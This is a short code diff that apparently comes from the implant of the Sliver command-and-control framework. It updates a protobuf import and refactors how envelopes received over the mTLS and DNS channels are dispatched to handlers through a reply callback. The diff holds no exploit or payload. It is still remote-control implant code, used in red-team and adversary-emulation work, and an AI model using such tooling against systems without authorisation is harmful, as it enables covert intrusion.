@@ -16,7 +16,7 @@ import (
 	"strconv"
 	"time"
 
-	pb "sliver/protobuf"
+	pb "sliver/protobuf/sliver"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -127,7 +127,12 @@ func mtlsConnect() error {
 		}
 		if err == nil {
 			if handler, ok := handlers[envelope.Type]; ok {
-				go handler.(func(chan *pb.Envelope, []byte))(send, envelope.Data)
+				go handler(envelope.Data, func(data []byte, err error) {
+					send <- &pb.Envelope{
+						ID:   envelope.ID,
+						Data: data,
+					}
+				})
 			}
 		}
 	}
@@ -170,7 +175,12 @@ func dnsConnect() error {
 	handlers := getSystemHandlers()
 	for envelope := range recv {
 		if handler, ok := handlers[envelope.Type]; ok {
-			go handler.(func(chan *pb.Envelope, []byte))(send, envelope.Data)
+			go handler(envelope.Data, func(data []byte, err error) {
+				send <- &pb.Envelope{
+					ID:   envelope.ID,
+					Data: data,
+				}
+			})
 		}
 	}
 	return nil
